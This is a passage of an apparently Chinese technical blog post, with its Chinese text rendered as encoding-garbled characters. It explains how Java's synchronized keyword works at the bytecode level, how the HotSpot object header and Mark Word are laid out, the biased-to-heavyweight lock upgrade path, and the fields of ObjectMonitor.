            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>();
     }
}
</code></pre>
<p>ä»£ç å¯¹åº”çš„å­—èŠ‚ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//å°†å¸ƒå±€å˜é‡è¡¨ä¸­çš„ç¬¬0ä½å‹å…¥æ“ä½œæ•°æ ˆï¼Œï¼ˆå› ä¸ºè¿™æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œç¬¬0ä½å­˜çš„æ˜¯å½“å‰å¯¹è±¡ï¼Œæ‰€ä»¥å°±æ˜¯å°†å½“å‰å¯¹è±¡å‹å…¥æ“ä½œæ•°æ ˆï¼‰</span>
<span class="hljs-number">0</span> aload_0
<span class="hljs-comment">//å¤åˆ¶å½“å‰å¯¹è±¡å¼•ç”¨å¹¶å°†å…¶å‹å…¥æ“ä½œæ•°æ ˆ</span>
<span class="hljs-number">1</span> dup
<span class="hljs-comment">//å°†å¤åˆ¶çš„å¯¹è±¡å¼•ç”¨å­˜å‚¨åœ¨å±€éƒ¨å˜é‡è¡¨ä¸‹æ ‡ä¸º1çš„ä½ç½®</span>
<span class="hljs-number">2</span> astore_1
<span class="hljs-comment">//è·å–å¯¹è±¡é”ï¼Œè¿›å…¥åŒæ­¥å—</span>
<span class="hljs-number">3</span> monitorenter
<span class="hljs-comment">//ä»Systemç±»çš„outå­—æ®µä¸­è·å–é™æ€PrintStreamå¯¹è±¡çš„å¼•ç”¨</span>
<span class="hljs-number">4</span> getstatic #<span class="hljs-number">2</span> &lt;java/lang/System.out : Ljava/io/PrintStream;&gt;
<span class="hljs-comment">//å°†å¸¸é‡æ± ä¸­ç´¢å¼•ä¸º#5çš„å­—ç¬¦ä¸²â€œhelloâ€å‹æ ˆ</span>
<span class="hljs-number">7</span> ldc #<span class="hljs-number">5</span> &lt;hello&gt;
<span class="hljs-comment">//è°ƒç”¨PrintStreamå¯¹è±¡çš„println()æ–¹æ³•æ¥æ‰“å°å †æ ˆé¡¶éƒ¨çš„å­—ç¬¦ä¸²å¯¹è±¡</span>
<span class="hljs-number">9</span> invokevirtual #<span class="hljs-number">4</span> &lt;java/io/PrintStream.println : (Ljava/lang/String;)V&gt;
<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª RuntimeException å®ä¾‹ã€‚</span>
<span class="hljs-number">12</span> <span class="hljs-keyword">new</span> #<span class="hljs-number">6</span> &lt;java/lang/RuntimeException&gt;
<span class="hljs-comment">//å¤åˆ¶æ“ä½œæ•°æ ˆæ ˆé¡¶çš„å€¼ã€‚å¹¶å‹æ ˆï¼ˆè¿™é‡Œå°±æ˜¯å¤åˆ¶RuntimeExceptionå®ä¾‹ï¼‰</span>
<span class="hljs-number">15</span> dup
<span class="hljs-comment">//è°ƒç”¨ RuntimeException å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚ï¼ˆè°ƒç”¨initæ–¹æ³•ï¼Œæ¶ˆè€—äº†ä¸€ä¸ªå®ä¾‹ï¼‰</span>
<span class="hljs-number">16</span> invokespecial #<span class="hljs-number">7</span> &lt;java/lang/RuntimeException.&lt;init&gt; : ()V&gt;
<span class="hljs-comment">//æŠ›å‡ºæ ˆé¡¶çš„å¼‚å¸¸</span>
<span class="hljs-number">19</span> athrow
<span class="hljs-comment">//å°†æ“ä½œæ•°æ ˆæ ˆé¡¶çš„æ•°å€¼å­˜å‚¨åˆ°å±€éƒ¨å˜é‡è¡¨ä¸­ä¸‹æ ‡ä¸º 2 çš„ä½ç½®ã€‚ï¼ˆè¿™é‡Œæ”¾çš„è¿˜æ˜¯RuntimeExceptionå®ä¾‹ï¼‰</span>
<span class="hljs-number">20</span> astore_2
<span class="hljs-comment">//å°†å±€éƒ¨å˜é‡è¡¨ä¸­ä¸‹æ ‡ä¸º 1 çš„å…ƒç´ åŠ è½½åˆ°æ“ä½œæ•°æ ˆä¸­ã€‚</span>
<span class="hljs-number">21</span> aload_1
<span class="hljs-comment">//é‡Šæ”¾å¯¹è±¡çš„ç›‘è§†å™¨é”ã€‚</span>
<span class="hljs-number">22</span> monitorexit
<span class="hljs-comment">//å°†å±€éƒ¨å˜é‡è¡¨ä¸­ä¸‹æ ‡ä¸º 2 çš„å˜é‡å‹å…¥æ“ä½œæ•°æ ˆã€‚</span>
<span class="hljs-number">23</span> aload_2
<span class="hljs-comment">//æŠ›å‡ºæ ˆé¡¶çš„å¼‚å¸¸</span>
<span class="hljs-number">24</span> athrow
</code></pre>
<p>â€ƒâ€ƒæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¾å¼æŠ›å‡ºå¼‚å¸¸åï¼Œåªæœ‰ä¸€ä¸ªmonitorenterå’Œä¸€ä¸ªmonitorexitã€‚æ–¹æ³•æ‰§è¡Œç»“æŸåè‡ªåŠ¨é‡Šæ”¾é”ã€‚å¹¶æŠŠæœªå¤„ç†çš„å¼‚å¸¸æŠ›å‡ºã€‚</p>
<h3 data-id="heading-3">1.3 æƒ…å†µ3</h3>
<p>ç°åœ¨æˆ‘ä»¬ç”¨synchronizedä¿®é¥°æ–¹æ³•</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>{
        System.out.println(<span class="hljs-string">"hello"</span>);
}
</code></pre>
<p>å…¶å¯¹åº”çš„å­—èŠ‚ç å¦‚ä¸‹</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-number">0</span> getstatic #<span class="hljs-number">2</span> &lt;java/lang/System.out : Ljava/io/PrintStream;&gt;
<span class="hljs-number">3</span> ldc #<span class="hljs-number">3</span> &lt;hello&gt;
<span class="hljs-number">5</span> invokevirtual #<span class="hljs-number">4</span> &lt;java/io/PrintStream.println : (Ljava/lang/String;)V&gt;
<span class="hljs-number">8</span> <span class="hljs-keyword">return</span>
</code></pre>
<p>â€ƒâ€ƒå¯ä»¥çœ‹åˆ°åŒæ­¥æ–¹æ³•åœ¨å­—èŠ‚ç å±‚é¢æ²¡æœ‰monitorenterï¼Œmonitorexitç›¸å…³çš„æŒ‡ä»¤ï¼Œå½“synchronizedé”ä¿®é¥°æ–¹æ³•æ—¶ï¼Œè¢«ä¿®é¥°çš„æ–¹æ³•ä¼šæ¯”æ™®é€šæ–¹æ³•çš„å¤šä¸€ä¸ªACC_SYNCHRONIZED æ ‡è¯†ç¬¦ï¼Œæ ¹æ®è¿™ä¸ªæ˜¯å¦æœ‰è¿™ä¸ªæ ‡è¯†æ¥å†³å®šæ˜¯å¦è¦è·å–é”å¯¹è±¡ã€‚</p>
<h3 data-id="heading-4">1.4 æ€»ç»“</h3>
<p>â€ƒâ€ƒå¦‚æœè¯´çœ‹ä¸æ‡‚ä¸Šé¢çš„å­—èŠ‚ç å…¶å®å¯¹æˆ‘ä»¬ç»§ç»­æ·±å…¥synchronizedå½±å“å¹¶ä¸å¤§ã€‚æˆ‘ä»¬åªéœ€è¦çŸ¥é“ï¼Œæ— è®ºæ˜¯monitorenterå’Œmonitorexitè¿˜æ˜¯ACC_SYNCHRONIZEDï¼Œ å®ƒä»¬éƒ½æ˜¯æ˜¯ Java è™šæ‹Ÿæœºï¼ˆJVMï¼‰å®ç°åŒæ­¥ï¼ˆsynchronizedï¼‰çš„ä¸¤ç§ä¸åŒæœºåˆ¶</p>
<p>å¥½äº†ï¼Œä¸‹é¢æ€»ç»“ä¸€ä¸‹ï¼š</p>






























<table><thead><tr><th><strong>ç‰¹æ€§</strong></th><th><strong>åŒæ­¥ä»£ç å— (Synchronized Block)</strong></th><th><strong>åŒæ­¥æ–¹æ³• (Synchronized Method)</strong></th></tr></thead><tbody><tr><td><strong>å­—èŠ‚ç è¡¨ç°</strong></td><td>åŒ…å«æ˜¾å¼çš„ monitorenter<br/> å’Œ monitorexit</td><td>æ— ç‰¹æ®ŠæŒ‡ä»¤ï¼Œä»…æœ‰ ACC_SYNCHRONIZED æ ‡å¿—</td></tr><tr><td><strong>è§¦å‘æ—¶æœº</strong></td><td>æ‰§è¡Œåˆ°æŒ‡ä»¤æ—¶å°è¯•è·å– monitor</td><td>æ–¹æ³•è°ƒç”¨æŒ‡ä»¤ï¼ˆå¦‚ invokevirtualï¼‰è¯†åˆ«åˆ°æ ‡å¿—æ—¶</td></tr><tr><td><strong>é”çš„å¯¹è±¡</strong></td><td>æ‹¬å·ä¸­æŒ‡å®šçš„å¯¹è±¡</td><td>this å¯¹è±¡ï¼ˆå®ä¾‹æ–¹æ³•ï¼‰æˆ– Class<br/> å¯¹è±¡ï¼ˆé™æ€æ–¹æ³•ï¼‰</td></tr><tr><td><strong>å¼‚å¸¸å¤„ç†</strong></td><td>éœ€è¦æ˜¾å¼çš„å¼‚å¸¸è·¯å¾„æ¥ç¡®ä¿ monitorexit</td><td>ç”± JVM éšå¼ç¡®ä¿æ–¹æ³•é€€å‡ºï¼ˆæ— è®ºæ­£å¸¸è¿˜æ˜¯å¼‚å¸¸ï¼‰æ—¶é‡Šæ”¾é”</td></tr></tbody></table>
<h2 data-id="heading-5">2. å¯¹è±¡çš„å†…å­˜å¸ƒå±€</h2>
<p>åœ¨ç»§ç»­æ·±å…¥synchronizedä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰å¿…è¦å…ˆçŸ¥é“ä¸€ä¸‹javaå¯¹è±¡çš„å†…å­˜å¸ƒå±€ã€‚</p>
<p>åœ¨HotSpotè™šæ‹Ÿæœºé‡Œï¼Œå¯¹è±¡åœ¨å †å†…å­˜ä¸­çš„å­˜å‚¨å¸ƒå±€å¯ä»¥åˆ’åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š</p>
<ol>
<li>å¯¹è±¡å¤´ï¼ˆHeaderï¼‰</li>
<li>å®ä¾‹ æ•°æ®ï¼ˆInstance Dataï¼‰</li>
<li>å¯¹é½/å†…å­˜å¡«å……ï¼ˆPaddingï¼‰</li>
</ol>
<p>â€ƒâ€ƒå¯¹äºsynchronizedæˆ‘ä»¬é‡ç‚¹éœ€è¦å…³æ³¨ä¸€ä¸‹å¯¹è±¡å¤´ï¼ˆHeaderï¼‰ã€‚é‚£å¯¹äºä¸€ä¸ªå¯¹è±¡çš„å¯¹è±¡å¤´è€Œè¨€é‡Œé¢æœ‰ä»€ä¹ˆå‘¢ï¼Ÿè¿™é‡Œå…ˆä»¥64ä½è™šæ‹Ÿæœºè¯´æ˜ä¸€ä¸‹ã€‚</p>
<p>Javaå¯¹è±¡å¤´åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼š</p>
<ol>
<li>Mark Workï¼šMark Wordè®°å½•å¯¹è±¡çš„HashCodeã€é”æ ‡å¿—ä½å’Œåå‘é”ä¿¡æ¯ç­‰</li>
<li>ç±»å‹æŒ‡é’ˆï¼šæŒ‡å‘è¯¥å¯¹è±¡çš„ç±»å…ƒæ•°æ®</li>
<li>æ•°ç»„é•¿åº¦ï¼šä»…åœ¨å¯¹è±¡ä¸ºæ•°ç»„æ—¶å­˜åœ¨ï¼Œè¡¨ç¤ºè¯¥æ•°ç»„çš„é•¿åº¦</li>
</ol>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bd9ee66556e422f9ab32bb68c2c7ed2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281861&amp;x-signature=gyV%2BDBBd7g8XoktbSzfZ%2BCvL2yI%3D" alt="" loading="lazy"/></p>
<p>ä½†æ˜¯ç”±äºå­˜åœ¨æŒ‡é’ˆå‹ç¼©ï¼Œå¯¹è±¡å¤´å¤§å°å¹¶ä¸æ˜¯è¯´æ˜¯å›ºå®šçš„ã€‚è¿™é‡Œå¯ä»¥æŸ¥é˜…æŒ‡é’ˆå‹ç¼©çš„ç›¸å…³çŸ¥è¯†ã€‚</p>
<p>â€ƒâ€ƒjavaä¸­ä½¿ç”¨ä¸€ä¸ªå¯¹è±¡æ¥ä½œä¸ºä¸€æŠŠé”ï¼Œå…¶é”çš„çŠ¶æ€åˆ†ä¸º4ç§ï¼ˆç”±è½»åˆ°é‡ï¼‰ï¼šæ— é”-&gt;åå‘é”-&gt;è½»é‡é”-&gt;é‡é‡é”ï¼Œé”çŠ¶æ€çš„æ ‡å¿—ä½å°±å­˜å‚¨åœ¨å¯¹è±¡å¤´çš„Mark Wordä¸­æœ€å2ä¸ªæ¯”ç‰¹ä½ã€‚</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01dd8a146de348be9bf783fa0d9142e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281861&amp;x-signature=WCx71anSmR4bYbxPR5qonluFZ0E%3D" alt="" loading="lazy"/></p>
<p>Mark Word æœ€åä¸¤ä½ä¸º 11 ä»£è¡¨å½“å‰å¯¹è±¡å¤„äºä¸å¯ç”¨çš„çŠ¶æ€ï¼Œå³åœ¨è¿›è¡Œåƒåœ¾å›æ”¶æ—¶å¯¹è±¡å·²ç»è¢«æ ‡è®°ä¸ºä¸å¯è¾¾</p>
<h2 data-id="heading-6">3. synchronizedé”çš„å‡çº§</h2>
<p>â€ƒâ€ƒé€šè¿‡ä¸Šè¿°äº†è§£ï¼Œæˆ‘ä»¬ä¹ŸçŸ¥é“äº†synchronizedé”æ˜¯æœ‰ç­‰çº§çš„ã€‚ä¸ºäº†æé«˜å¹¶å‘æ€§èƒ½å’Œå‡å°‘é”ç«äº‰ï¼ŒJavaä»1.6ç‰ˆæœ¬å¼€å§‹å¼•å…¥äº†é”å‡çº§æœºåˆ¶ï¼Œå°†synchronizedé”ä»åå‘é”çŠ¶æ€è½¬æ¢ä¸ºè½»é‡çº§é”çŠ¶æ€ã€é‡é‡çº§é”çŠ¶æ€ç­‰çº§åˆ«ã€‚é”å‡çº§çš„è¿‡ç¨‹æ˜¯è‡ªåŠ¨è¿›è¡Œçš„ï¼Œå¼€å‘è€…æ— éœ€æ‰‹åŠ¨å¹²é¢„ã€‚Javaè™šæ‹Ÿæœºä¼šæ ¹æ®å½“å‰é”çš„çŠ¶æ€ã€ç«äº‰æƒ…å†µç­‰å› ç´ è‡ªåŠ¨å†³å®šé”çš„çº§åˆ«ã€‚ä¸‹é¢ç”±è½»åˆ°é‡æ¥è®²è§£ï¼š</p>
<h4 data-id="heading-7">3.1åå‘é”ï¼ˆBiased Lockingï¼‰</h4>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e538c499a6741d483ed35cc416790dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281861&amp;x-signature=wK%2F1m46YtaAMNWdp2SXJWPm9OZs%3D" alt="" loading="lazy"/></p>
<p>â€ƒâ€ƒåå‘é”ä¸­çš„â€œåâ€ï¼ŒæŒ‡çš„æ˜¯â€œåå¿ƒã€åå‘â€ã€‚å®ƒçš„å«ä¹‰æ˜¯ï¼šé”ä¼šä¼˜å…ˆåå‘ç¬¬ä¸€ä¸ªè·å–å®ƒçš„çº¿ç¨‹ã€‚å¦‚æœåœ¨åç»­çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ²¡æœ‰å…¶ä»–çº¿ç¨‹æ¥ç«äº‰è¿™æŠŠé”ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹åœ¨æ•´ä¸ªä½¿ç”¨æœŸé—´éƒ½æ— éœ€å†è¿›è¡Œä»»ä½•åŒæ­¥æ“ä½œã€‚</p>
<p>â€ƒâ€ƒå½“ä¸€ä¸ªçº¿ç¨‹è·å¾—äº†å¯¹è±¡çš„é”å¹¶ä¸”è¿™ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å…¶ä»–çº¿ç¨‹æ‰€è®¿é—®æ—¶ï¼Œè¯¥çº¿ç¨‹ä¼šè¿›å…¥åå‘é”çŠ¶æ€ï¼Œå¹¶åœ¨å¯¹è±¡å¤´ä¸­è®°å½•ä¸‹è¯¥çº¿ç¨‹çš„IDï¼ˆå¦‚ä¸Šå›¾æ‰€ç¤ºï¼‰ã€‚æ­¤æ—¶ï¼Œå¦‚æœå…¶ä»–çº¿ç¨‹æƒ³è¦è®¿é—®è¯¥å¯¹è±¡ï¼Œåªéœ€è¦æ£€æŸ¥å¯¹è±¡å¤´ä¸­çš„çº¿ç¨‹IDæ˜¯å¦ä¸è‡ªå·±ç›¸åŒå³å¯ã€‚</p>
<ol>
<li>å¦‚æœæ˜¯åŒä¸€ä¸ªçº¿ç¨‹è¯·æ±‚è·å–é”ï¼Œåˆ™è¡¨ç¤ºè¯¥å¯¹è±¡è¿˜æ²¡æœ‰è¢«å…¶ä»–çº¿ç¨‹ç«äº‰è¿‡ï¼ŒJVM ä¼šè®¤ä¸ºè¯¥çº¿ç¨‹ä»ç„¶åœ¨æ‰§è¡ŒåŒæ­¥æ–¹æ³•ï¼Œç›´æ¥å°†åå‘é”æ ‡è®°ä¸ºæœ‰æ•ˆ</li>
<li>å¦‚æœä¸åŒï¼Œè¡¨ç¤ºå‘ç”Ÿäº†ç«äº‰ï¼Œå·²ç»æœ‰å…¶ä»–çº¿ç¨‹æ¥è®¿é—®äº†ã€‚è¿™ä¸ªæ—¶å€™ä¼šå°è¯•ç”¨CASæ¥æ›¿æ¢MarkWordé‡Œé¢çš„çº¿ç¨‹ID</li>
<li>å¦‚æœ CAS æ“ä½œæˆåŠŸï¼Œé‚£ä¹ˆè¡¨ç¤ºè¯¥çº¿ç¨‹å·²ç»è·å¾—äº†åå‘é”ï¼Œå¯ä»¥ç›´æ¥è¿›å…¥åŒæ­¥æ–¹æ³•ä¸­æ‰§è¡ŒåŒæ­¥æ“ä½œã€‚</li>
<li>å¦‚æœ CAS æ“ä½œå¤±è´¥ï¼Œå¯èƒ½ç”±äºç«äº‰å¤ªæ¿€çƒˆæˆ–è€…å­˜åœ¨å…¶å®ƒçº¿ç¨‹å·²ç»æŒæœ‰åå‘é”è€Œå¯¼è‡´ï¼ŒJVM å°±éœ€è¦æ’¤é”€åå‘é”ï¼Œå¹¶å°è¯•ä½¿ç”¨è½»é‡çº§é”æˆ–é‡é‡çº§é”æ¥ä¿è¯çº¿ç¨‹å®‰å…¨</li>
</ol>
<h4 data-id="heading-8">3.2 è½»é‡çº§é”ï¼ˆLightweight Lockingï¼‰</h4>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fb33ec7ef054757a58b45cfbde2e8e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281861&amp;x-signature=TGB4Eyyq2y%2BPLktLWOmgHkm1hgw%3D" alt="" loading="lazy"/></p>
<p>â€ƒâ€ƒå½“å¤šä¸ªçº¿ç¨‹ç«äº‰åŒä¸€ä¸ªé”æ—¶ï¼Œä¼šè¿›å…¥è½»é‡çº§é”çŠ¶æ€ã€‚æ­¤æ—¶ï¼Œç³»ç»Ÿä¼šåœ¨å½“å‰çº¿ç¨‹çš„æ ˆå¸§ä¸­åˆ›å»ºä¸€ä¸ªLock Recordï¼ˆé”è®°å½•ï¼‰ï¼Œå¹¶å°†å¯¹è±¡å¤´ä¸­çš„Mark Wordå¤åˆ¶åˆ°è¯¥é”è®°å½•ä¸­ï¼Œå¹¶å°†å¯¹è±¡å¤´ä¸­çš„Mark WordæŒ‡å‘è¯¥é”è®°å½•ã€‚ç„¶åï¼Œå½“å‰çº¿ç¨‹ä¼šå°è¯•ä½¿ç”¨CASåŸå­æ“ä½œæ¥ä¿®æ”¹å¯¹è±¡å¤´çš„Mark Wordä¸ºæŒ‡å‘é”è®°å½•çš„æŒ‡é’ˆã€‚</p>
<ol>
<li>å¦‚æœæˆåŠŸï¼Œå½“å‰çº¿ç¨‹å°±è·å¾—äº†é”å¹¶å¯ä»¥ç›´æ¥æ‰§è¡Œä»£ç å—ã€‚</li>
</ol>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b706a8494ca43b088523a5dac12e76c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281861&amp;x-signature=xiWWzRdxzIyaB09kYOWykDej4WQ%3D" alt="" loading="lazy"/></p>
<ol start="2">
<li>å¦‚æœCASå¤±è´¥,æœ‰ä¸¤ç§æƒ…å†µ
<ol>
<li>å¦‚æœæ˜¯å…¶å®ƒçº¿ç¨‹å·²ç»æŒæœ‰äº†è¯¥ Object çš„è½»é‡çº§é”ï¼Œè¿™æ—¶è¡¨æ˜æœ‰ç«äº‰ï¼Œ ä¸”é€šè¿‡ CAS è‡ªæ—‹æ— æ³•æˆåŠŸè·å–é”æ—¶ ï¼Œä¼šè†¨èƒ€ä¸ºé‡é‡çº§é”</li>
<li>å¦‚æœåŒä¸€çº¿ç¨‹å†æ¬¡è¿›å…¥è¢« synchronized  ä¿®é¥°çš„ä»£ç å—ï¼ˆå‘ç”Ÿé”é‡å…¥ï¼‰ï¼ŒJVM ä¸ä¼šé‡æ–°ç«äº‰é”ï¼Œè€Œæ˜¯åœ¨è¯¥çº¿ç¨‹çš„æ ˆä¸­å†åˆ›å»ºä¸€ä¸ªobj ä¸º null çš„ Lock Recordï¼Œç”¨ä»¥è¡¨ç¤ºä¸€æ¬¡é‡å…¥å±‚çº§ã€‚</li>
<li>å½“çº¿ç¨‹é€€å‡º synchronized ä»£ç å—æ—¶ï¼ŒJVM ä¼šå¼¹å‡ºå½“å‰å¯¹åº”çš„ï¼›å¦‚æœè¯¥ Lock Record çš„ obj ä¸º nullï¼Œè¯´æ˜è¿™æ˜¯ä¸€æ¬¡é”é‡å…¥çš„é€€å‡ºï¼Œä»…å‡å°‘ä¸€å±‚é‡å…¥ï¼Œä¸ä¼šçœŸæ­£é‡Šæ”¾é”ï¼›åªæœ‰åœ¨é€€å‡ºæœ€å¤–å±‚åŒæ­¥å—ã€å¼¹å‡ºæœ€åˆçš„ Lock Record æ—¶ï¼Œæ‰ä¼šæ‰§è¡ŒçœŸæ­£çš„è§£é”æ“ä½œã€‚</li>
<li><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/762ed7be9d624976ba47f3708555065e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281861&amp;x-signature=E%2Fc5jx%2F3Q53gBAdlcp0E1UNM3wg%3D" alt="" loading="lazy"/></li>
<li>å½“çº¿ç¨‹é€€å‡º <code>synchronized</code> ä»£ç å—è¿›è¡Œè§£é”æ—¶ï¼Œå¦‚æœå½“å‰å¼¹å‡ºçš„ Lock Record çš„ <code>obj</code> ä¸ä¸º <code>null</code>ï¼ŒJVM ä¼šé€šè¿‡ CAS æ“ä½œå°è¯•å°†å¯¹è±¡å¤´ä¸­çš„ Mark Word æ¢å¤ä¸ºé”å‰çš„çŠ¶æ€;<br/>
i. å¦‚æœ CAS æˆåŠŸï¼Œè¯´æ˜æ²¡æœ‰å‘ç”Ÿç«äº‰ï¼Œè½»é‡çº§é”è¢«æ­£å¸¸é‡Šæ”¾ï¼›<br/>
ii. å¦‚æœ CAS å¤±è´¥ï¼Œåˆ™è¡¨æ˜åœ¨æŒé”æœŸé—´å‘ç”Ÿäº†ç«äº‰ï¼Œè½»é‡çº§é”å·²ç»è†¨èƒ€ä¸ºé‡é‡çº§é”ï¼Œåç»­è§£é”å°†ç”±é‡é‡çº§é”æœºåˆ¶å®Œæˆã€‚</li>
<li>CAS çš„è‡ªæ—‹æ¬¡æ•°æ˜¯è‡ªé€‚åº”çš„ï¼šå¦‚æœä¸Šä¸€æ¬¡è‡ªæ—‹æˆåŠŸè·å¾—äº†é”ï¼ŒJVM ä¼šå¢åŠ ä¸‹æ¬¡çš„æœ€å¤§è‡ªæ—‹æ¬¡æ•°ï¼Œå› ä¸ºè®¤ä¸ºé”å¾ˆå¿«å°±èƒ½é‡Šæ”¾ï¼›åä¹‹ï¼Œå¦‚æœè‡ªæ—‹å¤šæ¬¡æœªæˆåŠŸï¼ŒJVM ä¼šå‡å°‘è‡ªæ—‹æ¬¡æ•°ï¼Œä»¥é¿å…çº¿ç¨‹åœ¨ CPU ä¸Šç©ºè½¬æµªè´¹èµ„æºã€‚</li>
</ol>
</li>
</ol>
<h4 data-id="heading-9">3.3 é‡é‡çº§é”ï¼ˆHeavyweight Lockingï¼‰</h4>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e15def6609584a76aef5438db36c0c05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281861&amp;x-signature=yQ6o9G9ZbKXAawEK2YoBoJeCsDs%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-10"><strong>Monitoré”</strong></h5>
<p>â€ƒâ€ƒ åœ¨ä»‹ç»é‡é‡çº§é”ä¹‹å‰ï¼Œéœ€è¦å…ˆäº†è§£ä¸€ä¸ªæ¦‚å¿µï¼š<strong>Monitor é”</strong>ã€‚å®ƒæ˜¯ JVM å±‚é¢çš„é”ï¼Œç”± C++ å®ç°ã€‚<br/>
åœ¨åº•å±‚ï¼Œ<code>synchronized</code> ä¼šå…³è”ä¸€ä¸ª <code>ObjectMonitor</code> å¯¹è±¡ã€‚å½“ä¸€ä¸ªå¯¹è±¡åœ¨é‡é‡çº§é”çŠ¶æ€ä¸‹è¢« <code>synchronized</code> é”ä½æ—¶ï¼Œè¯¥å¯¹è±¡å¤´çš„ <strong>Mark Word</strong> ä¼šå­˜å‚¨ä¸€ä¸ªæŒ‡å‘ <code>ObjectMonitor</code> çš„æŒ‡é’ˆï¼Œä»è€Œå°†å¯¹è±¡ä¸å…¶å¯¹åº”çš„ <code>ObjectMonitor</code> å…³è”èµ·æ¥ï¼Œå®ç°çœŸæ­£çš„é”ç®¡ç†ã€‚</p>
<p>å…¶åº•å±‚å¯¹åº”çš„objectMonitorä»£ç å¯ä»¥åœ¨openjdkçš„å®˜ç½‘å’ŒGitHubæ‰¾åˆ°ï¼š</p>
<p><strong>å®˜ç½‘ï¼š</strong></p>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopenjdk.org%2F" target="_blank" title="https://openjdk.org/" ref="nofollow noopener noreferrer">openjdk.org/</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhg.openjdk.org%2Fjdk8u%2Fjdk8u-jsse-incubator%2Fhotspot%2Ffile%2F741cd0f77fac%2Fsrc%2Fshare%2Fvm%2Fruntime%2FobjectMonitor.hpp" target="_blank" title="https://hg.openjdk.org/jdk8u/jdk8u-jsse-incubator/hotspot/file/741cd0f77fac/src/share/vm/runtime/objectMonitor.hpp" ref="nofollow noopener noreferrer">hg.openjdk.org/jdk8u/jdk8uâ€¦</a></li>
</ol>
<p><strong>gayhub:</strong></p>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenjdk%2Fjdk%2Fblob%2Fmaster%2Fsrc%2Fhotspot%2Fshare%2Fruntime%2FobjectMonitor.cpp" target="_blank" title="https://github.com/openjdk/jdk/blob/master/src/hotspot/share/runtime/objectMonitor.cpp" ref="nofollow noopener noreferrer">github.com/openjdk/jdkâ€¦</a></li>
</ol>
<pre><code class="hljs language-java" lang="java">  ObjectMonitor() {
    <span class="hljs-comment">//åˆå§‹å€¼æ˜¯0ï¼Œç”¨äºåˆ¤æ–­å½“å‰å¯¹è±¡æ˜¯å¦è¢«é”å®šã€‚åŠ é”+1ï¼Œè§£é”-1</span>
    _count        = <span class="hljs-number">0</span>;
    <span class="hljs-comment">//é”é‡å…¥æ¬¡æ•°</span>
    _recursions   = <span class="hljs-number">0</span>;
    <span class="hljs-comment">//é”å®šå½“å‰å¯¹è±¡çš„çº¿ç¨‹ID</span>
    _owner        = NULL;
    <span class="hljs-comment">//ç­‰å¾…é˜Ÿåˆ—ï¼Œå­˜æ”¾ç­‰å¾…çš„çº¿ç¨‹</span>
    _WaitSet      = NULL;
    <span class="hljs-comment">//é˜»å¡é˜Ÿåˆ—ï¼Œå­˜æ”¾é˜»å¡çš„çº¿ç¨‹</span>
    _EntryList    = NULL ;
  }
</code></pre>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/262bed90622649c89bd5c580558d4080~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281861&amp;x-signature=r9juPFd4ctfwPaRynQnfCNeNqng%3D" alt="" loading="lazy"/><strong>åŠ é”æµç¨‹ç®€è¿°ï¼š</strong></p>
<ol>
<li>åˆ¤æ–­_countæ˜¯å¦ä¸º0
<ol>
